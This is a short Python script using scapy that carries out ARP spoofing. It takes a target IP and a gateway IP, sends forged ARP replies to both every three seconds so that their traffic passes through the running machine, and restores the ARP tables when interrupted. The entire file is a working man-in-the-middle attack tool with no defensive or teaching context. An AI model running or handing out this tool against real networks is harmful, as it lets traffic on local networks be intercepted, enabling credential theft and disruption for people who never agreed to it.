import scapy.all as scapy
import time
import optparse


def get_user_input():
    parse_object = optparse.OptionParser()
    parse_object.add_option("-t", "--target", dest="target_ip", help="Enter target IP")
    parse_object.add_option("-g", "--gateway", dest="gateway_ip", help="Enter gateway IP")
    (users_input, arguments) = parse_object.parse_args()

    if not users_input.target_ip or not users_input.gateway_ip:
        print("Enter both target and gateway IP addresses")

    return users_input


def arp_pos(target_ip, pos_ip):
    target_mac = get_mac(target_ip)
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=pos_ip)
    scapy.send(arp_response, verbose=False)


def reset(ip1, ip2):
    mac1 = get_mac(ip1)
    mac2 = get_mac(ip2)
    arp_response = scapy.ARP(op=2, pdst=ip1, hwdst=mac1, psrc=ip2, hwsrc=mac2)
    scapy.send(arp_response, verbose=False, count=6)


def get_mac(ip):
    arp_request_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = broadcast_packet / arp_request_packet
    answered_list = scapy.srp(combined_packet, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


user_input = get_user_input()
targetIP = user_input.target_ip
gatewayIP = user_input.gateway_ip


number = 0
try:
    while True:
        arp_pos(targetIP, gatewayIP)
        arp_pos(gatewayIP, targetIP)
        number += 2
        print("\rSending Packets " + str(number), end="")
        time.sleep(3)
except KeyboardInterrupt:
    print("\nQuit and Reset")
    reset(targetIP, gatewayIP)
    reset(gatewayIP, targetIP)
